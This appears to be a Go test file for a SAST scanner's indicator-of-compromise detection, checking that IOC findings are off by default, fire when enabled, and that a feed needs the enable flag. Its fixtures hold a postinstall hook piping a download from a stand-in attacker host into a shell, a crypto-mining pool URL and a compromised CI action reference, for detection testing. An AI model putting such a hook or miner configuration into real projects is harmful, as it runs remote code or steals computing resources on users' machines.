package pipeline_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/Mohamedashmar432/zero-strike-SAST-engine/internal/core"
	"github.com/Mohamedashmar432/zero-strike-SAST-engine/internal/pipeline"
)

// iocTree writes inert fixtures: an install hook that pipes a download into a
// shell, a stratum pool URL and a compromised action reference. None of the
// hosts resolve.
func iocTree(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	files := map[string]string{
		"package.json":             `{"name":"d","scripts":{"postinstall":"curl -s https://attacker.invalid/p.sh | sh"}}`,
		"miner.py":                 "POOL = \"stratum+tcp://pool.attacker.invalid:3333\"\n",
		".github/workflows/ci.yml": "jobs:\n  b:\n    steps:\n      - uses: tj-actions/changed-files@v45\n",
	}
	for rel, content := range files {
		p := filepath.Join(root, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return root
}

func iocFindings(res *pipeline.ScanResult) map[string]int {
	out := map[string]int{}
	for _, f := range res.Findings {
		if f.Kind == core.FindingKindIOC {
			out[f.RuleID]++
		}
	}
	return out
}

// TestIOCOffByDefault is the compatibility guarantee: a scan that does not ask
// for --enable-ioc produces no ioc findings at all, so existing output and CI
// gates are unchanged.
func TestIOCOffByDefault(t *testing.T) {
	root := iocTree(t)
	pipe, err := pipeline.New(pipeline.ScanConfig{RootPath: root, WorkerCount: 1, NoCache: true, EnableSecrets: true, EnableFrameworkChecks: true})
	if err != nil {
		t.Fatal(err)
	}
	res, err := pipe.Run(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if got := iocFindings(res); len(got) != 0 {
		t.Fatalf("ioc findings without EnableIOC: %v", got)
	}
}

func TestIOCEnabled(t *testing.T) {
	root := iocTree(t)
	pipe, err := pipeline.New(pipeline.ScanConfig{RootPath: root, WorkerCount: 1, NoCache: true, EnableIOC: true})
	if err != nil {
		t.Fatal(err)
	}
	res, err := pipe.Run(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	got := iocFindings(res)
	for _, id := range []string{"ZS-IOC-001", "ZS-IOC-005", "ZS-IOC-008"} {
		if got[id] != 1 {
			t.Errorf("%s: %d findings, want 1 (all: %v)", id, got[id], got)
		}
	}
}

func TestIOCFeedRequiresEnable(t *testing.T) {
	feed := filepath.Join(t.TempDir(), "feed.txt")
	if err := os.WriteFile(feed, []byte("domain:evil.invalid\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if _, err := pipeline.New(pipeline.ScanConfig{RootPath: t.TempDir(), IOCFeed: feed}); err == nil {
		t.Error("a feed without EnableIOC must be rejected, not ignored")
	}
	if _, err := pipeline.New(pipeline.ScanConfig{RootPath: t.TempDir(), EnableIOC: true, IOCFeed: feed}); err != nil {
		t.Errorf("feed with EnableIOC: %v", err)
	}
}
